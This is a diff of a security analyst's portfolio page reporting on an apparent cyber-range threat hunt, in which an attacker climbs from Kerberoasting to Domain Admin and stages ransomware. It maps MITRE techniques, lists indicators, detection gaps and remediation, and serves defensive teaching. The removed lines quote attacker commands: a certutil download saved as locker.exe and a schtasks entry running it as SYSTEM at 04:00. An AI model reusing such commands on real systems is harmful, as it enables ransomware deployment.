@@ -1,171 +1,226 @@
-<!doctype html><html lang="en"><head><meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Hunt 09: Lateral Descent — Threat Hunt Report</title>
-<link rel="stylesheet" href="report-theme.css">
-</head><body>
-<div class="site-nav"><a href="case-files.html">&larr; Back to Case Files</a><span class="brand">SAKHO_SEC &middot; HUNT 09: LATERAL DESCENT</span></div>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Hunt 09: Lateral Descent — Aboubacar Sakho</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' fill='%2308090b'/%3E%3Ctext x='16' y='46' font-family='monospace' font-size='38' font-weight='bold' fill='%23ff4433'%3E%3E%3C/text%3E%3C/svg%3E">
+<meta name="description" content="Full-chain Active Directory compromise — Kerberoasting to DCSync to Pass-the-Hash to ransomware staging. 39/39 flags, full clear.">
+<meta property="og:title" content="Hunt 09: Lateral Descent — Aboubacar Sakho">
+<meta property="og:description" content="Full-chain Active Directory compromise — Kerberoasting to DCSync to Pass-the-Hash to ransomware staging.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://mrabousakho.github.io/hunt09-report.html">
+<meta property="og:image" content="https://mrabousakho.github.io/og-image.png">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
 
-<div class="cover-simple" style="--accent:#ff5d73;--accent2:#ffb347">
+<header>
+  <nav>
+    <a href="index.html" class="brand">SAKHO<span class="underscore cur">_</span>SEC</a>
+    <div class="navlinks">
+      <a href="whoami.html" class="linkbox">WHOAMI</a>
+      <a href="case-files.html" class="linkbox">CASE FILES</a>
+      <a href="projects.html" class="linkbox">PROJECTS</a>
+      <a href="ops.html" class="linkbox">OPS</a>
+      <a href="contact.html" class="linkbox">CONTACT</a>
+    </div>
+  </nav>
+</header>
+
+<section class="report-hero">
   <div class="wrap">
-    <div class="eyebrow">Threat Hunt Report &middot; Cyber Range</div>
-    <div class="ksig"></div>
-    <h1>Lateral<br>Descent</h1>
-    <div class="sub">Full-chain Active Directory compromise, from Kerberoasting to ransomware staging.</div>
-    <div class="spacer"></div>
-    <div class="meta">
-      <div><span>Analyst</span><b>Aboubacar Sakho</b></div>
-      <div><span>Estate</span><b>greenfield.local</b></div>
-      <div><span>Telemetry</span><b>Sentinel + Defender XDR</b></div>
-      <div><span>Window</span><b>Jun 11&ndash;12, 2026</b></div>
-      <div><span>Result</span><b class="ok">39 / 39 &mdash; Full Clear</b></div>
-      <div><span>Classification</span><b>Portfolio &middot; TLP:CLEAR</b></div>
+    <div style="text-align:center;">
+      <span class="eyebrow-pill" style="color:var(--red);">&#9679; THREAT HUNT &middot; ACTIVE DIRECTORY</span>
+    </div>
+    <h1>LATERAL <span class="accent">DESCENT</span><span class="cur">_</span></h1>
+    <div class="sub">Hunt 09 &middot; greenfield.local &middot; Full-Chain AD Compromise</div>
+    <p class="desc">A threat actor climbed from a no-privilege foothold to Domain Admin in under two hours, then staged ransomware for a domain-wide 4 AM detonation. Investigated exclusively through KQL in Microsoft Sentinel and Defender XDR.</p>
+    <div class="stats">
+      <div class="stat"><b>39/39</b><span>Flags &mdash; Full Clear</span></div>
+      <div class="stat"><b>4</b><span>Privesc Steps to DA</span></div>
+      <div class="stat"><b>3</b><span>Servers Laterally Moved</span></div>
+      <div class="stat"><b>~6.5hr</b><span>Foothold to Ransomware Stage</span></div>
     </div>
   </div>
-</div>
+</section>
 
-<div class="body doc">
-
-<section>
-  <div class="eyebrow2" data-n="00">Executive Summary</div>
-  <h2>A four-step climb to Domain Admin</h2>
-  <p class="lead">On the night of June 11&ndash;12, 2026, a threat actor gained initial access to the Greenfield corporate estate via a compromised VPN account (<span class="mono">sancadmin</span>) and established a foothold on workstation GF-WS01 under user <span class="mono">p.singh</span>. Within two hours, the attacker escalated from a standard domain user to Domain Admin through a four-step privilege escalation chain.</p>
-  <p>Operating as Domain Admin, the attacker moved laterally across three servers using Impacket <span class="mono">wmiexec</span>, staged and exfiltrated Finance, HR, and Projects share data via a Cloudflare domain-fronting tunnel, installed AnyDesk as a persistent fallback, destroyed all backup and recovery mechanisms on the backup server, staged ransomware disguised as a Sysinternals tool, and deployed a domain-wide Group Policy Object to ensure payload delivery across the entire estate. Execution was scheduled for 04:00 AM.</p>
-
-  <div class="stats">
-    <div><b class="r">39/39</b><span>Flags &mdash; Full Clear</span></div>
-    <div><b class="c">4</b><span>Privesc Steps to DA</span></div>
-    <div><b class="a">3</b><span>Servers Laterally Moved</span></div>
-    <div><b class="g">~6.5hr</b><span>Foothold to Ransomware Stage</span></div>
+<section style="padding-top:0;">
+  <div class="wrap">
+    <div class="eyebrow"><span class="dot"></span> DEEP_DIVE_RESOURCES</div>
+    <div class="icon-grid">
+      <a href="#timeline" class="icon-box">
+        <div class="arrow">&rarr;</div>
+        <div class="ic num" style="color:var(--blue);">15+</div>
+        <h5>Timeline</h5>
+        <span>Full attack timeline</span>
+      </a>
+      <a href="#mitre" class="icon-box">
+        <div class="arrow">&rarr;</div>
+        <div class="ic num" style="color:var(--red);">14+</div>
+        <h5>MITRE ATT&amp;CK</h5>
+        <span>Techniques mapped</span>
+      </a>
+      <a href="#ioc" class="icon-box">
+        <div class="arrow">&rarr;</div>
+        <div class="ic num" style="color:var(--green);">6+</div>
+        <h5>IOCs</h5>
+        <span>Hosts, IPs, domains</span>
+      </a>
+    </div>
   </div>
 </section>
 
-<section>
-  <div class="eyebrow2" data-n="01">Privilege Escalation</div>
-  <h2>The four-step climb</h2>
-  <p>Each step was only possible because the prior step produced the right credential material.</p>
+<section style="padding-top:0;">
+  <div class="wrap">
+    <div class="eyebrow"><span class="dot"></span> PRIVILEGE ESCALATION</div>
+    <h2 class="head">The Four-Step Climb<span class="cur">_</span></h2>
+    <div class="phase-strip">
+      <div class="phase-card"><div class="num">STEP 1</div><h4>Kerberoast</h4><p>p.singh requested a TGS for the svc_backup SPN &mdash; RC4 (0x17) encrypted, crackable offline. T1558.003</p></div>
+      <div class="phase-card p2"><div class="num">STEP 2</div><h4>Offline Crack</h4><p>The RC4 ticket cracked offline, recovering svc_backup's plaintext password.</p></div>
+      <div class="phase-card p3"><div class="num">STEP 3</div><h4>DCSync</h4><p>svc_backup's replication rights pulled every NT hash from NTDS &mdash; including d.williams and KRBTGT. T1003.006</p></div>
+      <div class="phase-card p4"><div class="num">STEP 4</div><h4>Pass-the-Hash</h4><p>d.williams' NT hash authenticated Domain Admin sessions across every estate host. T1550.002</p></div>
+    </div>
 
-  <div class="twrap"><table>
-    <thead><tr><th>Step</th><th>Technique</th><th>What It Used</th><th>What It Produced</th></tr></thead>
-    <tbody>
-      <tr><td class="mono">1</td><td>Kerberoast (T1558.003)</td><td>p.singh requested TGS for svc_backup SPN</td><td>RC4 (0x17) encrypted service ticket</td></tr>
-      <tr><td class="mono">2</td><td>Offline Crack (T1558.003)</td><td>The RC4 TGS ticket, cracked offline</td><td>svc_backup plaintext password</td></tr>
-      <tr><td class="mono">3</td><td>DCSync (T1003.006)</td><td>svc_backup: DS-Replication-Get-Changes-All</td><td>All NT hashes from NTDS &mdash; incl. d.williams + KRBTGT</td></tr>
-      <tr><td class="mono">4</td><td>Pass-the-Hash (T1550.002)</td><td>d.williams NT hash from DCSync output</td><td>Authenticated DA sessions on all estate hosts</td></tr>
-    </tbody>
-  </table></div>
-
-  <div class="call key">
-    <div class="h">Clinic Key</div>
-    <p>Kerberoasting is low-noise &mdash; any domain user can request a TGS with no elevated rights. The only detection window before DCSync is EventID 4769 with EncryptionType 0x17 (RC4). If svc_backup had been configured AES-only, the ticket would be uncrackable and the entire chain collapses at Step 2.</p>
+    <div class="scenario-box">
+      <div class="tag-label">&#9889; CLINIC KEY</div>
+      <p>Kerberoasting is low-noise &mdash; any domain user can request a TGS with no elevated rights. The only detection window before DCSync is EventID 4769 with EncryptionType 0x17 (RC4). If svc_backup had been configured AES-only, the entire chain collapses at Step 2.</p>
+    </div>
   </div>
 </section>
 
-<section>
-  <div class="eyebrow2" data-n="02">Lateral Movement</div>
-  <h2>wmiexec (Impacket)</h2>
-  <p>The attacker used Impacket <span class="mono">wmiexec</span> to execute commands remotely on GF-SRV01, GF-BKP01, and GF-DC01. wmiexec creates a semi-interactive shell via WMI <span class="mono">Win32_Process.Create()</span>, staging output to a temporary file on the ADMIN$ share &mdash; a distinctive forensic signature.</p>
+<section style="padding-top:0;">
+  <div class="wrap">
+    <div class="eyebrow" style="color:var(--blue);"><span class="dot" style="background:var(--blue); box-shadow:0 0 8px var(--blue);"></span> LATERAL MOVEMENT</div>
+    <h2 class="head">wmiexec (Impacket)<span class="cur">_</span></h2>
+    <p class="sub" style="max-width:680px;">The attacker used Impacket's wmiexec to execute commands remotely on GF-SRV01, GF-BKP01, and GF-DC01 &mdash; a semi-interactive shell via WMI that leaves a distinctive forensic signature.</p>
 
-  <div class="code"><div class="bar"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="lbl">forensic signature</span></div>
-  <pre>cmd.exe /Q /c &lt;command&gt; 1&gt; \\127.0.0.1\ADMIN$\__&lt;float_epoch&gt; 2&gt;&amp;1</pre></div>
-
-  <div class="twrap"><table>
-    <thead><tr><th>Indicator</th><th>Value / Detail</th></tr></thead>
-    <tbody>
-      <tr><td>Process parent</td><td class="mono">wmiprvse.exe (WMI Provider Host)</td></tr>
-      <tr><td>Process user</td><td class="mono">NT AUTHORITY\NETWORK SERVICE</td></tr>
-      <tr><td>Output staging</td><td class="mono">\\127.0.0.1\ADMIN$\__1781225160.750315</td></tr>
-      <tr><td>Source IP</td><td class="mono">10.1.0.120 (GF-VPN01 &mdash; attacker's egress point)</td></tr>
-    </tbody>
-  </table></div>
-</section>
-
-<section>
-  <div class="eyebrow2" data-n="03">Exfiltration &amp; C2</div>
-  <h2>Domain Fronting via Cloudflare</h2>
-  <p>Finance, HR, and Projects shares were compressed and exfiltrated using Cloudflare's <span class="mono">trycloudflare.com</span> CDN as a fronting domain. HTTPS connections reach the Cloudflare edge, but the Host header redirects to the true C2 &mdash; <span class="mono">cdn-backup.abordsecurity.space</span>. Defenders watching only TLS SNI or TCP destination see a benign CDN address.</p>
-
-  <div class="call warn">
-    <div class="h">Detection Rule</div>
-    <p>When the URL host and the HTTP Host header disagree, the header is the true destination. Inspect TLS SNI vs HTTP Host header in proxy/firewall logs. Retries at 12:56 and 12:57 AM dropped the Host header, revealing the real CDN destination.</p>
-  </div>
-
-  <p>AnyDesk &mdash; a legitimate RMM tool &mdash; was downloaded, installed, and placed in the Startup folder on GF-SRV01, giving the attacker a persistent, legitimate remote-access channel that blends with enterprise RMM traffic and avoids custom-malware detection.</p>
-</section>
-
-<section>
-  <div class="eyebrow2" data-n="04">Impact Phase</div>
-  <h2>Backup destruction &amp; ransomware staging</h2>
-  <p>On GF-BKP01, the attacker executed T1490 (Inhibit System Recovery) in under 90 seconds: deleted all Volume Shadow Copies, stopped the Veeam backup service, disabled Windows Recovery, and deleted the Windows Server Backup catalog.</p>
-
-  <div class="code"><div class="bar"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="lbl">ransomware staging</span></div>
-  <pre>certutil -urlcache -split -f https://download.sysinternals.com/files/PsExec.zip C:\Windows\Temp\locker.exe
-schtasks /create /tn "GreenfieldUpdate" /tr "C:\Windows\Temp\locker.exe" /sc once /st 04:00 /ru SYSTEM /f</pre></div>
-
-  <div class="call crit">
-    <div class="h">Masquerading (T1036)</div>
-    <p><span class="mono">locker.exe</span> was downloaded under the name PsExec.zip from a trusted Microsoft Sysinternals URL. The scheduled task reused the name "GreenfieldUpdate" &mdash; the same task name planted on GF-WS01 hours earlier, linking entry to impact.</p>
+    <div class="query-card" style="border-left-color:var(--blue);">
+      <div class="qhead"><h4>Forensic Signature</h4><span class="tag">T1021.006</span></div>
+      <pre>cmd.exe /Q /c &lt;command&gt; 1&gt; \\127.0.0.1\ADMIN$\__&lt;float_epoch&gt; 2&gt;&amp;1</pre>
+      <p>Process parent: wmiprvse.exe &middot; Process user: NT AUTHORITY\NETWORK SERVICE (not SYSTEM) &middot; Source IP: 10.1.0.120 (GF-VPN01, the attacker's egress point)</p>
+    </div>
   </div>
 </section>
 
-<section>
-  <div class="eyebrow2" data-n="05">Detection Gaps</div>
-  <h2>What the logging missed</h2>
-  <div class="twrap"><table>
-    <thead><tr><th>Gap</th><th>What Was Missed</th><th>Logging Fix</th></tr></thead>
-    <tbody>
-      <tr><td>Kerberoasting Alerting</td><td>EventID 4769 existed but no alert fired on EncryptionType 0x17 (RC4)</td><td>Alert on 4769 where EncryptionType = 0x17 for non-machine accounts; enforce AES-only on service accounts</td></tr>
-      <tr><td>LDAP Enumeration</td><td>SPN queries, ACL walks, group lookups via LDAP generated no log</td><td>Enable LDAP diagnostic logging (EventID 1644) to surface anomalous queries</td></tr>
-      <tr><td>AD Object Auditing (SACL)</td><td>EventID 5136/4662 never fired &mdash; no SACLs configured</td><td>Enable Directory Service Access auditing on domain objects and policy containers</td></tr>
-    </tbody>
-  </table></div>
-</section>
-
-<section>
-  <div class="eyebrow2" data-n="06">MITRE ATT&amp;CK Coverage</div>
-  <h2>Full technique mapping</h2>
-  <div class="twrap"><table>
-    <thead><tr><th>ID</th><th>Technique</th><th>Tactic</th></tr></thead>
-    <tbody>
-      <tr><td class="mono">T1558.003</td><td>Kerberoasting</td><td>Credential Access</td></tr>
-      <tr><td class="mono">T1003.006</td><td>DCSync</td><td>Credential Access</td></tr>
-      <tr><td class="mono">T1550.002</td><td>Pass-the-Hash</td><td>Lateral Movement</td></tr>
-      <tr><td class="mono">T1021.006</td><td>Remote Services: WMI</td><td>Lateral Movement</td></tr>
-      <tr><td class="mono">T1090.004</td><td>Domain Fronting</td><td>Command &amp; Control</td></tr>
-      <tr><td class="mono">T1219 / T1547.001</td><td>Remote Access Software / Startup Persistence</td><td>C2 / Persistence</td></tr>
-      <tr><td class="mono">T1484.001</td><td>Group Policy Modification</td><td>Defense Evasion / Persistence</td></tr>
-      <tr><td class="mono">T1490</td><td>Inhibit System Recovery</td><td>Impact</td></tr>
-      <tr><td class="mono">T1486</td><td>Data Encrypted for Impact</td><td>Impact</td></tr>
-    </tbody>
-  </table></div>
-  <p style="text-align:center; margin-top:12px;"><span class="tag">14 total techniques mapped across 9 tactics</span></p>
-</section>
-
-<section>
-  <div class="eyebrow2" data-n="07">Remediation</div>
-  <h2>Incident response actions</h2>
-  <div class="grid2">
-    <div class="card"><div class="k">R1 &mdash; Cut Access First</div><p>Reset all compromised credentials (d.williams, svc_backup, sancadmin, p.singh) before touching any artifact. Rotate KRBTGT twice to invalidate any forged Golden Tickets.</p></div>
-    <div class="card"><div class="k">R2 &mdash; Remove Malicious GPO</div><p>Delete the "Greenfield Security Update" GPO from AD and purge its SYSVOL folder; run gpupdate /force estate-wide.</p></div>
-    <div class="card"><div class="k">R3 &mdash; Rotate All Secrets</div><p>Full DCSync means every credential is burned. Reset all domain passwords, rotate KRBTGT twice, rotate trust keys.</p></div>
-    <div class="card"><div class="k">R4 &mdash; Close Logging Blind Spots</div><p>Enable LDAP diagnostic logging and Directory Service Access auditing; alert on 4769/RC4 for service accounts.</p></div>
+<section style="padding-top:0;">
+  <div class="wrap">
+    <div class="eyebrow" style="color:var(--orange);"><span class="dot" style="background:var(--orange); box-shadow:0 0 8px var(--orange);"></span> EXFIL &amp; IMPACT</div>
+    <h2 class="head">Domain Fronting &amp; Ransomware Staging<span class="cur">_</span></h2>
+    <div class="grid cols-2">
+      <div class="card">
+        <div class="top-row"><h3>Cloudflare Domain Fronting</h3><span class="badge high">T1090.004</span></div>
+        <p class="desc">Finance, HR, and Projects shares exfiltrated via trycloudflare.com &mdash; the HTTP Host header redirected to the true C2 (cdn-backup.abordsecurity.space) while TLS SNI showed a benign CDN address.</p>
+        <div class="tags"><span class="tag">Cloudflare</span><span class="tag">Exfiltration</span></div>
+      </div>
+      <div class="card">
+        <div class="top-row"><h3>Backup Destruction</h3><span class="badge critical">T1490</span></div>
+        <p class="desc">In under 90 seconds on GF-BKP01: all Volume Shadow Copies deleted, Veeam stopped, Windows Recovery disabled, backup catalog wiped.</p>
+        <div class="tags"><span class="tag">Impact</span><span class="tag">Recovery</span></div>
+      </div>
+      <div class="card">
+        <div class="top-row"><h3>Ransomware Masquerading</h3><span class="badge critical">T1036</span></div>
+        <p class="desc">locker.exe downloaded under the name PsExec.zip from a trusted Sysinternals URL, scheduled via the same task name planted hours earlier &mdash; linking entry to impact.</p>
+        <div class="tags"><span class="tag">Masquerading</span><span class="tag">Ransomware</span></div>
+      </div>
+      <div class="card">
+        <div class="top-row"><h3>AnyDesk Fallback</h3><span class="badge high">T1219</span></div>
+        <p class="desc">Legitimate RMM software installed to the Startup folder on GF-SRV01 &mdash; a persistent access channel that blends with normal enterprise traffic.</p>
+        <div class="tags"><span class="tag">Persistence</span><span class="tag">RMM</span></div>
+      </div>
+    </div>
   </div>
 </section>
 
-<section>
-  <div class="eyebrow2" data-n="08">Hunt Summary</div>
-  <h2>Final score</h2>
-  <p>39 questions (Q1&ndash;Q34 investigative + R1&ndash;R4 remediation) covering Initial Access, Credential Access, Lateral Movement, Collection, Exfiltration, C2, Persistence, Impact, and Remediation &mdash; investigated exclusively through KQL queries in Microsoft Sentinel and Microsoft Defender XDR.</p>
-  <div class="stats">
-    <div><b class="g">39/39</b><span>Full Clear</span></div>
-    <div><b class="c">2</b><span>Estates Scoped</span></div>
-    <div><b class="a">10</b><span>Log Sources Queried</span></div>
+<section style="padding-top:0;">
+  <div class="wrap">
+    <div class="eyebrow" style="color:var(--green);"><span class="dot" style="background:var(--green); box-shadow:0 0 8px var(--green);"></span> DETECTION GAPS</div>
+    <h2 class="head">What the Logging Missed<span class="cur">_</span></h2>
+    <div class="grid cols-2">
+      <div class="card">
+        <div class="top-row"><h3>Kerberoasting Alerting</h3></div>
+        <p class="desc">EventID 4769 existed but no alert fired on EncryptionType 0x17. Fix: alert on 4769/RC4 for non-machine accounts; enforce AES-only on service accounts.</p>
+      </div>
+      <div class="card">
+        <div class="top-row"><h3>AD Object Auditing (SACL)</h3></div>
+        <p class="desc">EventID 5136/4662 never fired &mdash; no SACLs configured. Fix: enable Directory Service Access auditing on domain objects and policy containers.</p>
+      </div>
+    </div>
   </div>
 </section>
 
-<div class="footer">
-  <span>CONFIDENTIAL &mdash; ABOUBACAR SAKHO</span>
-  <span>hunt.lognpacific.com &middot; Access Code: CR-HUNT-JUN26</span>
-</div>
+<section id="timeline" style="padding-top:0;">
+  <div class="wrap">
+    <div class="eyebrow" style="color:var(--blue);"><span class="dot" style="background:var(--blue); box-shadow:0 0 8px var(--blue);"></span> ATTACK_TIMELINE</div>
+    <h2 class="head">All Times UTC, June 11&ndash;12<span class="cur">_</span></h2>
+    <div class="timeline-grid">
+      <div class="timeline-card"><div class="ts">21:54</div><h5>C2 Delivery</h5><p>Kerberoasting SPN request for svc_backup begins the chain.</p><span class="badge success">T1558.003</span></div>
+      <div class="timeline-card"><div class="ts">23:22</div><h5>DCSync</h5><p>Full NTDS replicated via svc_backup's replication rights.</p><span class="badge success">T1003.006</span></div>
+      <div class="timeline-card"><div class="ts">23:26</div><h5>PtH Foothold</h5><p>GreenfieldUpdate scheduled task created via Pass-the-Hash.</p><span class="badge success">T1053.005</span></div>
+      <div class="timeline-card"><div class="ts">00:46&ndash;00:55</div><h5>Lateral + Exfil</h5><p>wmiexec to GF-SRV01, AnyDesk installed, shares exfiltrated via Cloudflare.</p><span class="badge success">T1021.006</span></div>
+      <div class="timeline-card"><div class="ts">01:00&ndash;01:09</div><h5>Backup Destruction</h5><p>Shadow copies, Veeam, and backup catalog wiped on GF-BKP01.</p><span class="badge success">T1490</span></div>
+      <div class="timeline-card"><div class="ts">01:09</div><h5>Ransomware Staged</h5><p>locker.exe downloaded disguised as PsExec.zip, scheduled for 04:00.</p><span class="badge success">T1036</span></div>
+      <div class="timeline-card"><div class="ts">01:22</div><h5>Domain-Wide GPO</h5><p>"Greenfield Security Update" GPO linked to the domain root.</p><span class="badge success">T1484.001</span></div>
+      <div class="timeline-card"><div class="ts">04:00</div><h5>Detonation Scheduled</h5><p>locker.exe scheduled to execute as SYSTEM across the estate.</p><span class="badge success">T1486</span></div>
+    </div>
+  </div>
+</section>
 
-</div>
-</body></html>
+<section id="mitre" style="padding-top:0;">
+  <div class="wrap">
+    <div class="eyebrow" style="color:var(--red);"><span class="dot"></span> MITRE_ATTCK</div>
+    <h2 class="head">Full Technique Mapping<span class="cur">_</span></h2>
+    <div class="grid cols-2">
+      <div class="card"><div class="top-row"><h3>Kerberoasting</h3><span class="tag mono">T1558.003</span></div><p class="desc">Credential Access</p></div>
+      <div class="card"><div class="top-row"><h3>DCSync</h3><span class="tag mono">T1003.006</span></div><p class="desc">Credential Access</p></div>
+      <div class="card"><div class="top-row"><h3>Pass-the-Hash</h3><span class="tag mono">T1550.002</span></div><p class="desc">Lateral Movement</p></div>
+      <div class="card"><div class="top-row"><h3>Remote Services: WMI</h3><span class="tag mono">T1021.006</span></div><p class="desc">Lateral Movement</p></div>
+      <div class="card"><div class="top-row"><h3>Domain Fronting</h3><span class="tag mono">T1090.004</span></div><p class="desc">Command &amp; Control</p></div>
+      <div class="card"><div class="top-row"><h3>Remote Access Software</h3><span class="tag mono">T1219</span></div><p class="desc">Command &amp; Control</p></div>
+      <div class="card"><div class="top-row"><h3>Group Policy Modification</h3><span class="tag mono">T1484.001</span></div><p class="desc">Defense Evasion / Persistence</p></div>
+      <div class="card"><div class="top-row"><h3>Inhibit System Recovery</h3><span class="tag mono">T1490</span></div><p class="desc">Impact</p></div>
+      <div class="card"><div class="top-row"><h3>Data Encrypted for Impact</h3><span class="tag mono">T1486</span></div><p class="desc">Impact</p></div>
+    </div>
+    <p style="text-align:center; margin-top:16px;"><span class="tag">14 total techniques mapped across 9 tactics</span></p>
+  </div>
+</section>
+
+<section id="ioc" style="padding-top:0;">
+  <div class="wrap">
+    <div class="eyebrow" style="color:var(--green);"><span class="dot" style="background:var(--green); box-shadow:0 0 8px var(--green);"></span> INDICATORS_OF_COMPROMISE</div>
+    <h2 class="head">Hosts, IPs, and Artifacts<span class="cur">_</span></h2>
+    <div class="grid cols-2">
+      <div class="card"><div class="top-row"><h3>10.1.0.120</h3><span class="badge critical">SOURCE IP</span></div><p class="desc">GF-VPN01 &mdash; attacker's egress point for all wmiexec sessions.</p></div>
+      <div class="card"><div class="top-row"><h3>cdn-backup.abordsecurity.space</h3><span class="badge critical">C2 DOMAIN</span></div><p class="desc">True exfiltration destination behind the Cloudflare front.</p></div>
+      <div class="card"><div class="top-row"><h3>GreenfieldUpdate</h3><span class="badge high">TASK NAME</span></div><p class="desc">Reused scheduled task name linking initial foothold to ransomware detonation.</p></div>
+      <div class="card"><div class="top-row"><h3>locker.exe</h3><span class="badge high">RANSOMWARE</span></div><p class="desc">Masqueraded as PsExec.zip from a trusted Sysinternals URL.</p></div>
+      <div class="card"><div class="top-row"><h3>Greenfield Security Update</h3><span class="badge high">MALICIOUS GPO</span></div><p class="desc">Domain-wide GPO created for payload delivery to every estate host.</p></div>
+      <div class="card"><div class="top-row"><h3>AnyDesk (Startup Folder)</h3><span class="badge active">PERSISTENCE</span></div><p class="desc">Legitimate RMM tool installed as a fallback access channel on GF-SRV01.</p></div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="foot-grid">
+      <div>
+        <div class="foot-brand">SAKHO_SEC</div>
+        <div class="foot-tagline">FIND<span class="r">EVIL</span>.BUILD<span class="r">SYSTEMS</span>.<span class="cur">_</span></div>
+        <div class="foot-sub">Offense. Defense. Code.</div>
+      </div>
+      <div class="foot-social">
+        <a href="https://github.com/mrabousakho" title="GitHub" target="_blank" rel="noopener">&#8981;</a>
+        <a href="https://www.linkedin.com/in/asakho/" title="LinkedIn" target="_blank" rel="noopener">in</a>
+        <a href="mailto:aboubacar.sakho@email.com" title="Email">&#9993;</a>
+      </div>
+    </div>
+  </div>
+</footer>
+
+<script src="script.js"></script>
+</body>
+</html>
